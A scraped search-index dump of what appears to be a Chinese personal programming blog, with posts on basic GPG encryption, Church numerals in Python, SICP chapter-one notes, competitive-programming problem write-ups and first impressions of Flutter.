\u003cfilepath\u003e 来验证，如果提示是损坏的，就千万不要用！ ","date":"2018-04-30","objectID":"/post/df74bcdd/:3:3","tags":["PGP","GPG","公钥","隐私"],"title":"开始使用GPG","uri":"/post/df74bcdd/"},{"categories":["个人记录"],"content":"3. 加密发送给别人的信息 首先是找到你要发送的人的公钥ID或者邮箱： gpg --list-keys 记录下来以后，写下信息并使用如下命令加密： gpg -r \u003ckeyID_or_email\u003e -o \u003coutput_path\u003e -e \u003cfilepath\u003e 你可以省略-o选项，这样加密后的信息会直接输出到在你的终端。 ","date":"2018-04-30","objectID":"/post/df74bcdd/:3:4","tags":["PGP","GPG","公钥","隐私"],"title":"开始使用GPG","uri":"/post/df74bcdd/"},{"categories":["个人记录"],"content":"4. 解密来自别人的信息 gpg \u003cencrypt_file\u003e -o \u003coutput_path\u003e 就这么简单，你也可以省略-o选项，如上所说。 那现在开始你的本子重要文件都可以好好保存啦！ 顺带一提，我的公钥的指纹是： 2792FC149B21DA174CED7A0EC73C1FF650BB7A03 你可以使用： curl https://keybase.io/lxdlam/pgp_keys.asc | gpg --import 把我的公钥导入你的本地环境。这些信息都可以在我的keybase.io查到。 Have a more pravite life! ","date":"2018-04-30","objectID":"/post/df74bcdd/:3:5","tags":["PGP","GPG","公钥","隐私"],"title":"开始使用GPG","uri":"/post/df74bcdd/"},{"categories":["技术笔记"],"content":"让我们来谈谈抽象。 什么是抽象？几乎所有程序员都听说过。不就是把一些对应的实体抽象成一些数据结构啊，算法啊或者设计模式之类的，然后写成代码呗。 但是你真的懂抽象的威力吗？我们只有数据结构和算法等抽象吗？能不能不使用任何数据结构去表达一个二元组呢？ 这一系列短文有3篇（可能），我将从Python的基础入手，带你简单入门Lambda表达式，然后走进邱奇计数的世界，见证函数式编程的高阶抽象能力。 准备好了吗？让我们开始吧。 注：阅读本系列短文你只需要简单接触过Python和初中代数水平即可。 ","date":"2018-04-03","objectID":"/post/2d31b5ef/:0:0","tags":["Church Numeral","Church Encoding","邱奇计数","Python","函数式编程"],"title":"邱奇计数 (1)","uri":"/post/2d31b5ef/"},{"categories":["技术笔记"],"content":"0x00. 基础 为什么选择Python？ Python使用简单，语法易于理解，Lambda Expression虽然比起函数式语言很弱，但是应付邱奇计数绰绰有余。 而如果使用Haskell，阅读者需要对类型论有一定的了解；而Scheme又不利于测试和阅读。 权衡之下，我选择了Python。 一切的开始，我们先了解以下做Lambda Expression。 Lambda Expression，在程序语言中我们可以简单理解为匿名函数。所谓匿名函数，就是没有名称的函数，多为临时使用而创建。 在数学上，一个Lambda Expression是这么表述的：$\\lambda x. \\lambda y. \\lambda z. x^2+y^2+z^2$，它其实和如下的$f$相等：$f(x,y,z)=x^2+y^2+z^2$。这个表达式很好理解，$\\lambda$意味着一个函数开始了，后面跟着的$x$是它的第一个参数，然后$.$，这个点号代表求值表达式。上面这个式子实际上是三个参数的级联应用，也就是先应用$x$，再应用$y$，最后应用$z$。我们把一个函数$f$应用$n$次表达为$f^n$，也就是说，$f^n=\\underbrace{f\\circ f \\circ\\cdots\\circ f}_{\\text{n times}}$。 Quiz 1 $\\lambda f. \\lambda x.f(x)$是什么意思？ 数学上的了解到这里就足够了，我们不会涉及更深入的Lambda Calculus的内容。 首先，我们知道Python的声明函数如下： def test(): print('Hello, Python!') return 几乎在所有语言中，我们的函数都是这么声明的。这么声明之后，假设当前的test函数是一个object，那么实际上我们是把这个object绑定到了test上。 这是声明了一个有名函数。那么有名自然就可以对应匿名函数，也就是Lambda Expression。 让我们来看一下Lambda Expression的语法： add = lambda x: lambda y: x + y # or add = lambda x, y: x + y 我们看到，一个匿名函数不需要def的语法块，直接使用lambda引起即可，后面跟着参数列表，用一个冒号:分割函数体和参数部分。上面的两个函数都被我绑定在了add这个名字上，实际上使用的时候并不需要，例如： sorted([1, 8, 3, 19, 3 ** 6], cmp=lambda x, y: x \u003c y) cmp需要一个函数，用于比较两个参数，这里我直接使用了一个Lambda Expression来代替。 之后我们需要讨论闭包的问题。什么是一个闭包？看下面代码： def outer(x): def inner(): return x return inner # outer(15)() ==\u003e 15 这就是一个闭包。一个闭包实际上可以看做一个内部函数，这个内部函数捕获了外部变量。上面的inner函数中，x并不属于它，但是我们调用outer(15)以后返回的这个inner能拿到15，也就是说，内部的inner捕获了外部的x，然后再把x返回了回来。 理解了闭包和Lambda Expression之后，我们就可以开始我们的邱奇计数之旅了。 Quiz 2 上面两种 add 的调用方式有区别吗？有什么区别？为什么？ ","date":"2018-04-03","objectID":"/post/2d31b5ef/:1:0","tags":["Church Numeral","Church Encoding","邱奇计数","Python","函数式编程"],"title":"邱奇计数 (1)","uri":"/post/2d31b5ef/"},{"categories":["技术笔记"],"content":"0x01. 零(zero)和后继函数(succ) 现在就到了正式的邱奇计数环节了！ 让我们首先考虑一下皮亚诺公理的几条内容： I. 0是自然数 …… 设S(n)为数n的后继，则 VI. 对任意自然数n，S(n)为自然数 …… 从这里我们可以知道：自然数系统的其中两个基础是$0$和后继的定义，所以我们的邱奇计数也需要从$0$和后继开始定义。 在皮亚诺公理系统中，后继就是这个数$+1$。例如$0$的后继就是$0+1=1$，$279$的后继就是$279+1=280$。也就是说，我们需要找到一种办法来描述“后一个”这个关系。 在邱奇计数中，邱奇选择了一种十分聪明的表达方式：函数的复合。什么意思呢？就是函数$f$应用$k$次表达的是自然数$k$。那么这样实际上表达一个数的后继就十分简单了：我们再应用一次函数$f$。 也就是说，假如有$k=f^k=\\underbrace{f\\circ f \\circ\\cdots\\circ f}_{\\text{k times}}$，那么$k+1$实际上就是$f\\ (f^k) = f^{k+1}=\\underbrace{f\\circ f \\circ\\cdots\\circ f}_{\\text{k+1 times}}$。 解决了后继的问题，再来考虑$0$的问题。我们从上面应用的角度考虑：$0$意味着函数应用的次数为$0$次，那也就是说，无论我们给什么函数$f$，$0$始终返回来一个和$f$无关的值。$f$本身需要一个参数，那么……我们直接把这个参数返回回来即可！ 这样的表达方法下，每一个数都是一个高阶函数，接受了一个函数$f$和一个数$x$作为参数。 那么，我们的表达就很简单了，首先是$0=\\lambda f.\\lambda x.x$，这是一个接受一个函数$f$和一个参数$x$的高阶函数，返回$x$本身。其次，一个数的后继就是在其身上再调用一次$f$，例如$1=\\lambda f.\\lambda x.f\\ x$，$2=\\lambda f.\\lambda x.f\\ (f\\ x)$。 Quiz 3 $4$用邱奇计数怎么表达？ 下面这个表就是邱奇计数的一个简单表示总结： 数 邱奇计数 $0$ $\\lambda f.\\lambda x.x$ $1$ $\\lambda f.\\lambda x.f\\ x$ $2$ $\\lambda f.\\lambda x.f\\ (f\\ x)$ $3$ $\\lambda f.\\lambda x.f\\ (f\\ (f\\ x))$ $\\cdots$ $\\cdots$ $n$ $\\lambda f.\\lambda x.f^n\\ x$ 那么，零的代码就很简单了： zero = lambda f: lambda x: x 这样我们就把$0$表达了出来。 现在我们来考虑后继。后继根据上面的讨论，实际上我们就是在外层套上一个f即可。 怎么套呢？我们考虑f的作用对象，考虑$2$：$\\lambda f.\\lambda x.f\\ (f\\ x)$，里面的$f\\ x$实际上就是$1$，所以就$2$是$f\\ 1$。从这一步我们知道，f的作用对象是上一个数，所以，后继函数是如下的表达：$\\text{succ}\\ n =\\lambda f.\\lambda x.f\\ n$。 转换成代码其实就是很简单的一行： succ = lambda n: lambda f: lambda x: f(n(f)(x)) 这样我们的后继函数就表达完了。 两个简单函数，就能把整个邱奇计数法的基础表示出来了。 Quiz 4 用Python代码写出来$4$的邱奇表示法。如果用 succ 表达呢？ ","date":"2018-04-03","objectID":"/post/2d31b5ef/:2:0","tags":["Church Numeral","Church Encoding","邱奇计数","Python","函数式编程"],"title":"邱奇计数 (1)","uri":"/post/2d31b5ef/"},{"categories":["技术笔记"],"content":"0x02. 邱奇化(toChurch)与去邱奇化(unChurch) 上一节讨论了如何表示$0$和后继，这一节考虑一个问题，我们怎么获得一个邱奇化的数呢？ 首先很简单，假如要把$0$邱奇化，我们直接返回zero即可，也就是说： toChurch = lambda x: zero if x == 0 接下来呢？ 考虑这么一个情况：$0$的后继是$1$，$2$的后继是$1$。那假如我们需要获得$2$，我们其实只需要获得$1$的后继即可，而需要获得$1$，我们只需要获得$0$的后继即可。 这个情况其实很明确，就是一个简单的递归，从$2$递减到$0$即可，那么toChurch就十分简单了： toChurch = lambda x: zero if x == 0 else succ(toChurch(n - 1)) 假如遇到了$0$我们就返回$0$，否则返回$n-1$的后继。代码十分清晰。 Quiz 5 尝试把 toChurch 改写成尾递归的版本。 邱奇化解决了，接下来我们讨论去邱奇化。 实际上我们考虑两个映射： $0$的映射：自然数：$0$；邱奇计数：$\\lambda f.\\lambda x.x$ 后继的映射：自然数：$+1$；邱奇计数：$\\text{succ}\\ n =\\lambda f.\\lambda x.f\\ n$。 那么互转怎么办？我们用$0$来代替邱奇计数的$0$，用$+1$来代替邱奇计数的后继函数。 $0$代替$0$并不难，直接让$x=0$即可，而$0$的后继就是在$0$的基础上应用$+1$这个函数即可，所以我们直接令$f=\\lambda m.m+1$。那么这样我们就构造出了unChurch的过程：$\\text{unChurch n} = n\\ (\\lambda m.m+1)\\ 0$。 Python代码也就容易得到了： unChurch = lambda n: n(lambda x: x + 1)(0) 到这里，我们邱奇化和去邱奇化都解决了。我们来试试如下的代码： unChurch(zero) // ==\u003e 0 unChurch(toChurch(198)) // ==\u003e 198 成功啦 :)。 Quiz 6 如果我把 unChurch 定义成：unChurch = lambda n: n(lambda x: x * x)(1)，那么 unChurch(toChurch(100)) 会得到什么结果？解释你的结果。 第一篇就到这里。 相信你到这里已经见识到了邱奇计数法的威力：我们并没有使用任何数或者数据结构，只使用了最简单的高阶函数和参数抽象出了完整的自然数表示法，根据一定变换可以和自然数进行互相的转换。 但是，作为一个自然数系统，不能运算有什么作用呢？ 下一节，让我们来分析三个重要但是基础的运算：加、乘和幂运算。与此同时，我还将提到如何使用代换模型来讨论函数的展开形式。 本节Quiz答案如下： 答案 $\\lambda f. \\lambda x.f(x)$是什么意思？ 这个表达式接受两个参数，一个是函数$f$，一个是数$x$，返回把$x$应用到函数$f$上的结果。 上面两种add的调用方式有区别吗？有什么区别？为什么？ 有区别，第一种的调用方式是：add(2)(4)，第二种的调用方式是：add(2, 4)。 区别产生的原因是这样，我们考虑第一种表达： add = lambda x: lambda y: x + y 这里面是两个嵌套的Lambda Expression，第一个是一个参数为x的匿名函数，这个函数内部又是一个匿名函数，内部的匿名函数捕获了外部的自由变量x，然后返回它加y的结果。 第二个则是一个有两个参数的匿名函数，和普通的函数一样。 $4$用邱奇计数怎么表达？ $4=\\lambda f.\\lambda x.f\\ (f\\ (f\\ (f\\ x)))$ 用Python代码写出来$4$的邱奇表示法。如果用succ表达呢？ four = lambda f: lambda x: f(f(f(f(x)))) # 使用succ four = succ(succ(succ(succ(zero)))) 尝试把toChurch改写成尾递归的版本。 tcHelper = lambda n, m: m if n == 0 else tcHelper(n - 1, succ(m)) toChurch = lambda n: tcHelper(n, zero) 如果我把unChurch定义成：unChurch = lambda n: n(lambda x: x * x)(1)，那么unChurch(toChurch(100))会得到什么结果？解释你的结果。 结果其实很简单，是1。这里考虑一个问题：x是多少？我们考虑2的情况，展开得到： lambda f: lambda x: f(f(x))(lambda x: x*x)(1) 我们把它应用进去以后得到： (lambda x: x * x)((lambda x: x * x)(1)) # ==\u003e (lambda x: x * x)(1 * 1) # ==\u003e (lambda x: x * x)(1) # ==\u003e (1 * 1) # ==\u003e 1 可以看到，即使是多次调用，总是返回$1\\times1$，所以无论$f$复合多少次都只会返回1。 本节的所有代码如下： zero = lambda f: lambda x: x succ = lambda n: lambda f: lambda x: f(n(f)(x)) unChurch = lambda n: n(lambda x: x + 1)(0) toChurch = lambda n: zero if n == 0 else succ(toChurch(n - 1)) # tail recursive # tcHelper = lambda n, m: m if n == 0 else tcHelper(n - 1, succ(m)) # toChurch = lambda n: tcHelper(n, zero) def main(): \"\"\" Test wrapper 1. zero and succ \u003e\u003e\u003e unChurch(zero) 0 \u003e\u003e\u003e unChurch(succ(succ(zero))) 2 2. unChurch and toChurch \u003e\u003e\u003e unChurch(toChurch(0)) 0 \u003e\u003e\u003e unChurch(toChurch(198)) 198 \"\"\" if __name__ == \"__main__\": import doctest doctest.testmod(verbose=True) ","date":"2018-04-03","objectID":"/post/2d31b5ef/:3:0","tags":["Church Numeral","Church Encoding","邱奇计数","Python","函数式编程"],"title":"邱奇计数 (1)","uri":"/post/2d31b5ef/"},{"categories":["读书笔记"],"content":"这是SICP纸质笔记的整理。 你可以在这里下载到重新排版过的英文原版或者直接在线阅读。点击这里购买中文纸质版(右侧)。 这里是我第一章的习题。 ","date":"2018-03-25","objectID":"/post/975c3b4d/:0:0","tags":["SICP","计算机程序的构造和解释","读书笔记"],"title":"SICP笔记(1)","uri":"/post/975c3b4d/"},{"categories":["读书笔记"],"content":"第一章 构造过程抽象 (P9) 1.1， 强有力语言提供的三种机制： 基本表达形式 组合的方法 抽象的方法 (P10-P11) 1.1.3，两种求值顺序： 正则序求值：完全展开后规约 (square (square (+ (square 5) (square 6)))) ;; 这里因为遇到了(square 5)，所以先求值，得到25 ;; =\u003e (square (square (+ 25 (square 6))) ;; =\u003e (square (square (+ 25 36))) ;; 只在必要时求值 是非严格求值(Non-strict Evalutaion)，只在必要时才进行求值。 应用序求值：先求值参数后应用： (square (square (+ (square 5) (square 6)))) ;; 这里(+)需要两个参数才能应用，所以立即对这两个参数进行求值 ;; =\u003e (square (square (+ 25 36))) ;; 应用前就求值完毕 是严格求值(Strict Evalutaion)，应用前就求职完毕 拓展阅读：维基百科 (P18-P19) 1.1.8，局部变量： 约束变量：一个过程的定义约束了所有变量，与名字无关，以这个过程的体为它们的作用域 自由变量：非约束变量，一般可以被子作用于捕获。 (补充内容) 1.1.8，作用域： 动态作用域 (Dynamic Scope)：Lisp采用。全局绑定栈，当我们在局部过程定义一个变量时，它的绑定会被推入全局栈，离开时栈顶弹栈，无论何时使用该变量时我们总是使用栈顶绑定。 词法作用域 (Lexical Scope)：Scheme采用。局部环境，即无论何时定义一个变量，我们总在局部环境绑定中操作，使用时也在局部环境寻找。 拓展阅读：维基百科 (P23) 1.2.1，计算过程(Process)与过程(Procedure)： 过程：语法上的形式。如递归过程：在定义中直接或间接调用自己的过程。 例： (define (fib n) (cond ((= n 0) 0) ((= n 1) 1) (else (+ (fib (- n 1)) (+ (fib (- n 2))))))) 这一过程直接调用了自己，是一个递归过程(Recursive procedure)。 计算过程：这一过程的进展形式。例如迭代计算过程：可能是以递归为形式，但是进展上是一种迭代的方式。 例： (define (fib n) (define (iter count a b) (if (= count n) b (iter (+ count 1) b (+ a b)))) (iter 0 1 0)) 这一过程虽然是一个递归过程，但是在进展上，是迭代的进展方式，所以这是一个迭代计算过程(Iterate process)。 辨析：过程指的是语法本身的含义，而计算过程指的是所描述的计算过程。 (P23) 1.2.1，尾递归： 尾递归可以在$O(1)$空间内执行迭代计算过程，即使这一计算使用的是递归过程描述的。 (Ex 1.13) 证明$Fib(n)$为最接近$\\frac{\\phi^n}{\\sqrt{5}}$的整数，其中$\\phi=\\frac{1+\\sqrt{5}}{2}$。 证：若要证明$Fib(n)$为最接近$\\frac{\\phi^n}{\\sqrt{5}}$的整数，可以证明$|Fib(n)-\\frac{\\phi^n}{\\sqrt{5}}|\u003c\\frac{1}{2}$ 若证上式，可证$Fib(n)=\\frac{\\phi^n-\\psi^n}{\\sqrt{5}}$，其中$\\psi=\\frac{1-\\sqrt{5}}{2}$。 使用归纳法证明上式：$Fib(0)=\\frac{\\phi^0-\\psi^0}{\\sqrt{5}}=0$，成立；$Fib(1)=\\frac{\\phi^1-\\psi^1}{\\sqrt{5}}=\\frac{\\sqrt{5}}{\\sqrt{5}}=1$，成立。 假设$Fib(n-1)=\\frac{\\phi^{n-1}-\\psi^{n-1}}{\\sqrt{5}}$与$Fib(n-2)=\\frac{\\phi^{n-2}-\\psi^{n-2}}{\\sqrt{5}}$成立， 由定义， $$ \\begin{aligned} Fib(n) \u0026= Fib(n-1)+Fib(n-2) \\\\\u0026= \\frac{\\phi^{n-1}-\\psi^{n-1}}{\\sqrt{5}}+\\frac{\\phi^{n-2}-\\psi^{n-2}}{\\sqrt{5}} \\\\\u0026= \\frac{\\phi^n(\\phi^{-2}+\\phi^{-1})+\\psi^n(\\psi^{-2}+\\psi^{-1})}{\\sqrt{5}} \\end{aligned} $$ 由于$\\phi^{-2}+\\phi^{-1}=\\frac{3-\\sqrt{5}}{2}+\\frac{\\sqrt{5}-1}{2}=1$，$\\psi^{-2}+\\psi^{-1}=\\frac{3+\\sqrt{5}}{2}-\\frac{\\sqrt{5}+1}{2}=1$， 立即可得$Fib(n)=\\frac{\\phi^n+\\psi^n}{\\sqrt{5}}$，得证。 那么立即有$Fib(n)-\\frac{\\phi^n}{\\sqrt{5}}=-\\frac{\\psi^n}{\\sqrt{5}}$。 又由$|\\frac{1}{\\sqrt{5}}|\u003c1, |\\psi^n|\u003c\\frac{1}{2}$，可得$|\\frac{\\psi^n}{\\sqrt{5}}|\u003c\\frac{1}{2}$，也就是$|Fib(n)-\\frac{\\phi^n}{\\sqrt{5}}|\u003c\\frac{1}{2}$，$\\mathtt{Q.E.D.}$ (P28) 1.2.3，增长阶（渐进紧确界）： 令$n$为可度量问题规模的参数，$R(n)$为计算$n$规模问题时所需的资源，我们称$R(n)$具有$\\Theta(f(n))$的增长阶，记为$R(n)=\\Theta(f(n))$，满足： $$ \\forall n, \\exists k_1,k_2\\in\\mathbb{Z}, k_1f(n)\\le R(n)\\le k_2(f(n)) $$ 其中$k_1,k_2$为与$n$无关的参量。 拓展阅读：算法复杂度的记号表示法，《算法导论》。 增长阶计算练习： Ex 1.14，把$n$元换成$k$枚硬币： 首先考虑(cc n 1)的情况，在这种情况下，每一个$n$都会带来以下两种展开：(cc (- n 1) 1)和(cc n 0)，也就是说，这样情况下总共会有$2n+1$个节点，时间复杂度自然为$O(n)$。由于$n$每增长$1$，这棵树的层数就增加$1$，所以空间复杂度为$O(n)$。 接下来考虑(cc n 2)，这样的情况会展开为(cc (- n 5) 2)和(cc n 1)，根据上述讨论得知(cc n 1)复杂度为$O(n)$，而这棵树一共有$\\frac{n}{5}$棵这样的子树，所以总共复杂度为$O(n^2)$。空间复杂度不变，仍然是$n$每增长$1$多一层调用。 那么根据如上考虑，(cc n k)总计的时间复杂度就为$O(n^k)$，空间复杂度为$O(n)$。 Ex 1.15，计算三角恒等式复杂度。 计算的核心代码为：(p (sine (/ angle 3.0)))，也就是说，对于每一个数，求得答案时，假如p调用了$n$次，那么一定满足$a\\le 0.1\\cdot 3^n$，对两边取对数，有$\\log{a}\\le \\log{0.1}+n\\log{3}$，也就是说，$n$和$\\log{a}$正相关。那么算法的时间复杂度和空间复杂度都为$O(\\log{a})$。 (P35) 概率算法： 在满足条件的情况下，有一定概率能保证解的正确性的算法，如费马素数检测。 (P35-P36) Ex 1.22~1.24，算法复杂度的讨论： 算法复杂度是用于衡量增长率的工具，而不是描述实际增长率的工具。 运算时间一般受以下因子影响： 运算环境：如瞬时I/O速度，CPU调度等 常数因子，如$O(kn)=O(n)$，此时$k$为常数因子，那么$O(2n)=O(n)=O(3n)$的两个算法速度并不一样。 等等。 我们使用算法复杂度来衡量增长速度，尤其是数据量比较大的情况下。 (P37) Ex 1.28，Miller-Rabin算法： 实现参照：1.28.scm 理论依据：费马小定理，若$n$为质数，那么$\\forall a\u003cn,a\\in \\mathbb{N}, a^{n-1}\\equiv1\\pmod n$，取$a$检查即可。 Miller-Rabin算法中会遇上$1$取模$n$的非平凡平方根，即：$\\exists b\\in\\mathbb{N}, 1\u003cb\u003cn-1, b^2\\mod n=1$。这样的数表示$n$不为素数。证明也很简单，考虑： $$ (x^2-1)\\mod n=0\\implies(x+1)(x-1)\\mod n =0 $$ 也就是说，假如$x$为非$2$的质数，上面的式子一定不成立（因为此时只会有$\\pm1$两个解）。 在Miller-Rabin算法运行过程中，我们大概有$50%$的几率遇上这样的数，所以测试总计$\\frac{n}{2}$次可以保证准确性。在实际使用中，一般取8次即可，大约$\\frac{1}{2}^8\\approx0.3%$的几率会遇到例外。 (P37) 1.3，高阶过程：以过程为参数，或者以过程为返回值的过程。 (P37) 1.3.1，求和记法：$\\sum^b_{n=a}","date":"2018-03-25","objectID":"/post/975c3b4d/:1:0","tags":["SICP","计算机程序的构造和解释","读书笔记"],"title":"SICP笔记(1)","uri":"/post/975c3b4d/"},{"categories":["趣题记录"],"content":"猜猜我寒假经历了什么？ 本来应该打线段树板子的晚上，我的Elementary OS正式“驾崩”，于是我装了很多天系统（以及摸鱼），度过了一个充实的寒假。 寒假的尾巴做了一些题目，就记一下寒假尾巴做过的这些题目吧。 我的答案仓库是Click Me!。根据题号你能找到我的答案，但是我的很多答案有很大的提高和优化空间，欢迎你与我探讨！ ","date":"2018-03-06","objectID":"/post/1e8a5360/:0:0","tags":["ACM-ICPC","刷题","算法竞赛","算法","数据结构"],"title":"寒假做题记录","uri":"/post/1e8a5360/"},{"categories":["趣题记录"],"content":"0x01. 模板题 这里应该是线段树的模板题，纪念一下，3月再补吧 喜闻乐见的什么都没有。 ","date":"2018-03-06","objectID":"/post/1e8a5360/:1:0","tags":["ACM-ICPC","刷题","算法竞赛","算法","数据结构"],"title":"寒假做题记录","uri":"/post/1e8a5360/"},{"categories":["趣题记录"],"content":"0x02. 趣题 这个假期也就主要打了Codeforces和AtCoder，所以绝大部分题目都来自于此。 ExpectedMinimumPowerDiv2 第一题是来自TopCoder的。 人生中的第一场TopCoder SRM，不得不说作为Codeforce规则的起源，这种规则真的紧张刺激，尤其是看聊天区有人在看我的Solution的时候，无敌紧张。 看题，给出两个整数$n$和$x$，在$1\\sim n$区间中任选$x$个数的一个子集$S$，把这个子集中的最小元素$\\min(S)$看作这个集合的代表元素。问这么选择下的$2^S$的数学期望。 首先数学期望定义是很明确的，出现的值乘以概率，由于这里面的选择随机，也就是等可能性选择，所以期望就是简单的总和除以方案数。 方案数是十分容易求的，$\\binom{n}{x}$，关键问题在于这个总和上。首先考虑这样一个子问题：包含$1$的选择方法有多少？实际上是另一个组合问题：我们确定了$1$，从剩下的$n-1$个元素中选择$x-1$个元素有多少种方法？很简单，就是$\\binom{n-1}{x-1}$。接下来来考虑$2$的情况：由于在$1$的情况中，已经包含了$2$的部分情况，这一部分可以求得为$\\binom{n-2}{x-2}$。那么$2$的选择方法有$\\binom{n-1}{x-1}$，我们拿掉这些情况就有$\\binom{n-1}{x-1}-\\binom{n-2}{x-2}=\\binom{n-2}{x-1}$种情况。以此类推，$3$就有$\\binom{n-3}{x-1}$种方法……直到$x$时有$\\binom{x-1}{x-1}$种情况为止。那么最终答案就是如下的简单式子： $$ \\frac{2^1\\cdot\\binom{n-1}{x-1}+2^2\\cdot\\binom{n-2}{x-1}+\\cdots+2^x\\cdot\\binom{x-1}{x-1}}{\\binom{n}{x}} $$ 一个循环就能计算了。 上面这个过程还有一种更直观的方法：我们从$1$开始迭代，那么当我们把含$1$的组全部筛选掉之后，$2$的选择时自然不能考虑$1$，所以本来$2$可以从剩下$n-1$个元素中选择，现在$1$也被排除，只剩下$n-2$个元素了，自然是$\\binom{n-2}{x-1}$。 比较好玩的数学问题，从公式推导上有考虑的价值。（然而比赛的时候手动验算算错了，后面写了个demo发现是对了一波就过了。要是不搞这些幺蛾子说不定分数还能更高。 Takahashi’s Information 一道比较有趣的方程问题。 给出一个9宫格，如下编号： $$\\begin{matrix}c_{1,1} \u0026 c_{1,2} \u0026 c_{1,3} \\\\ c_{2,1} \u0026 c_{2,2} \u0026 c_{3,3} \\\\ c_{3,1} \u0026 c_{3,2} \u0026 c_{3,3}\\end{matrix}$$ 对于每一个数，满足$c_{i,j}=a_i+b_j$。问是否存在这样的六元组$(a_1,a_2,a_3,b_1,b_2,b_3)$，使得上述命题成立。 这个题一上来很容易拆成$9$个方程的方程组去做，然而这个题实际上难度只是AtCoder Beginners Contest的第三题而已，肯定不会这么大动干戈。 首先观察一个很基本的事实：任何一个数的得出方法有多个。考虑$c_{1,1}=a_1+b_1, c_{2,1}=a_2+b_1$，马上就能得出$a_2-a_1=c_{2,1}-c_{1,1}$。根据这样的观察，我们可以解出$a_2-a_1,a_3-a_2,a_3-a_1$，那我们几乎可以立即得出$a_2-a_1+a_3-a_2=a_3-a_1$，这样通过两条路就解出了同一个解。假如上述命题成立，这样的等式一定成立，同时还可以对$b_2-b_1+b_3-b_2=b_3-b_1$做出验证，假如这两条都满足，毫无疑问命题成立。 官方题解则提供了另一种做法：首先根据观察，这样的解一定有无穷多个：考虑解元组$(a_1,a_2,a_3,b_1,b_2,b_3)$： $$ (p_1,p_2,p_3,q_1,q_2,q_3) $$ 我们可以对任意的一个偏移量$x$如下构造$(a_1’,a_2’,a_3’,b_1’,b_2’,b_3’)$： $$ (p_1+x,p_2+x,p_3+x,q_1-x,q_2-x,q_3-x) $$ 毫无疑问，$(a_1’,a_2’,a_3’,b_1’,b_2’,b_3’)$也是一组可行解，也就是说，这样的解有无穷多个。那也就是说，$\\exists x\\in\\mathbb{Z},a_1=p_1+x=0$。那到这里其实就很简单了，我们直接令$a_1=0$，然后代入解出一个解元组，之后逐条验证即可。 这一题有趣的地方在于不定方程的处理，我们并不是直接开始高斯消元，而是从一些基本的数学原理入手反向验证，是一道开拓思维的好题目。 Swap Adjacent Elements 前缀和是区间统计的一大利器。 给出$n$长度的一个序列$A=a_1,a_2,\\cdots,a_n$，同时给出一个$n-1$长度的字符串$S$，这个字符串的含义为：假如$S_i=1$，那么$a_i$可以和$a_{i+1}$任意多次按任意顺序互换，否则不行。问你根据给定的状况能否把这个序列排成上升序的。 一个排序问题。这里我们如下考虑：假如$a_j=i$，那么意味着$a_j$应该在$a_i$现在的位置上。由于这种交换没有步骤限制，我们可以在行动范围内任意的做出一些临时操作，所以我们的问题简化成了：$a_j$能否来到$i$这个位置。接下来考虑这样的$S=01111000110$，显而易见的是，$a_2\\sim a_5$与$a_9\\sim a_{10}$是可以无限互换的，那实际上这里就变成了一个很简单的情况：我们只需要考虑$j-i$这段区间内是否是连续的$1$。接下来我们考虑如何获得这个信息：我们把连续的$1$统计成距离，遇到$0$就重新统计，那么上面的$S$转化过后可得如下序列：$0,1,2,3,4,5,0,0,0,1,2,0$，那么我们就很容易可以计算两点间距离，上述问题就转化成$S’_i\\ge j-i$的问题。那这样我们只需要扫一遍$S$做一下距离统计，再扫一遍原序列即可，$\\mathcal{O}(n)$。 这一题又一次利用到了前缀和的统计优点，可以说前缀和统计是一个必备的区间统计技巧了，树状数组也是利用了这一个性质。 Vile Grasshoppers 很有趣的一道题目。 这有一棵树，树有许多树枝，依次编号为$2\\sim y$，同时，在$2\\sim p$上各有一只蚂蚱，这些蚂蚱的跳跃能力很强：假如这只蚂蚱在$x$号树枝上，那么它可以跳跃到$2\\cdot x, 3\\cdot x,\\cdots,\\lfloor\\frac{y}{x}\\rfloor\\cdot x$上。现在给出$y$和$p$，求最高的，不会被蚂蚱跳到的树枝的编号，如果没有这样的树枝，输出$-1$即可。 学过埃筛的一定知道这样的一个结论：一个数的两个不同的成对因子一定落在这个数的平方根两侧，也就是说，$\\forall p\u003cq, x=p\\cdot q$满足$2\\le p\\le\\sqrt{x}\u003cq\\le x$。这一题实际上就利用了这一个结论：我们对每一个数$k$来确认如下事实：$\\exists x\\in[2,p], x^2\\le k\\land x|k=0$，假如满足，那这个$k$不满足条件。那么我们直接倒序遍历$[p,y]$，来确认是否存在这样的$k$，存在即输出，否则输出$-1$即可。 这一点观察其实十分的简单：能够整除$x$的因子必定有一半在$[2,\\lfloor\\sqrt{x}\\rfloor]$里面，所以我们检测这里面所有因子即可。更深入思考其实有一个更强的结论：第一个小于等于$x$的质数一定满足要求。所以我们直接使用埃筛的筛法寻找第一个数就可以了。 来自于质数筛的一个小结论，就这样变成了一道十分有趣的数论题，这也正是数学的魅力。 ","date":"2018-03-06","objectID":"/post/1e8a5360/:2:0","tags":["ACM-ICPC","刷题","算法竞赛","算法","数据结构"],"title":"寒假做题记录","uri":"/post/1e8a5360/"},{"categories":["趣题记录"],"content":"0x03. 难题 其实这两个月遗留了很多难题，但是刚好遇上开学，所以也没来得及补，这些题就留给下个月吧～ ","date":"2018-03-06","objectID":"/post/1e8a5360/:3:0","tags":["ACM-ICPC","刷题","算法竞赛","算法","数据结构"],"title":"寒假做题记录","uri":"/post/1e8a5360/"},{"categories":["技术笔记"],"content":"我是大概这周的前几天知道Dart 2要推出而且Flutter进入Beta的。 说实话，Dart我有所耳闻，虽然我是一个Google的粉丝，但是话还是要说清楚，我真不认为Google在设计语言上有什么优势，甚至是并不擅长设计语言的（Go语言我浅尝辄止），而且Dart本身设计我认为也有问题（居然同时存在const和final关键字），我也只是粗略的看了一下语法就停了。 然而，在今晚的旅程过后，我决定把Flutter和Dart加进学习日程表（虽然优先级不会太高），因为Flutter颠覆了我这个“零经验”移动开发者的观念。这篇文章，就让我零零散散的谈谈今晚的旅程。 ","date":"2018-03-05","objectID":"/post/3885f5e9/:0:0","tags":["Flutter","Dart","Android"],"title":"初尝Flutter","uri":"/post/3885f5e9/"},{"categories":["技术笔记"],"content":"0x00. What is Flutter? 那首先，什么是Flutter？ 在讲Flutter之前，我们不得不提React Native，熟悉前端和移动端开发的同学肯定对这个东西有所了解。React Native是由Facebook在两年前推出的一套跨平台开发框架，使用React+JavaScript的组合来开发移动端应用。 当年我听说RN的原因是它的热更新：这套机制允许我们不用更新应用本身，而是通过云端推送更新的方式来对应用做出更新。 RN的出现的确给移动端开发掀起了一轮新的浪潮：跨平台、热更新、JavaScript。这样的组合，无论是对前端开发者还是移动端开发者都是极具吸引力的。同样，不少公司已经采用了这套框架，如我们熟悉的QQ 